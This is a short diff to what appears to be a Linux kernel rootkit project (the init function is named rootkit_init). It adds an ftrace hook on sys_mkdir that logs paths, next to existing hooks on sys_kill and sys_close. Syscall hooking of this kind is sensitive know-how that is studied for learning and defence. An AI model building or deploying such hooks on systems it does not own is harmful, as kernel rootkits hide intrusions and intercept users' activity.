@@ -52,7 +52,7 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
     return original_kill(pid, sig);
 }
 
-static asmlinkage long (*original_mkdir)(const char*, int);
+static asmlinkage long (*original_mkdir)(const char __user *, int);
 static asmlinkage long custom_mkdir(const char __user *pathname, umode_t mode)
 {
     printk("mkdir pathname: %s\n", pathname);
@@ -75,6 +75,7 @@ static asmlinkage long custom_close(unsigned int fd)
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &original_kill),
     HOOK("sys_close", custom_close, &original_close),
+    HOOK("sys_mkdir", custom_mkdir, &original_mkdir),
 };
 
 static int __init rootkit_init(void)
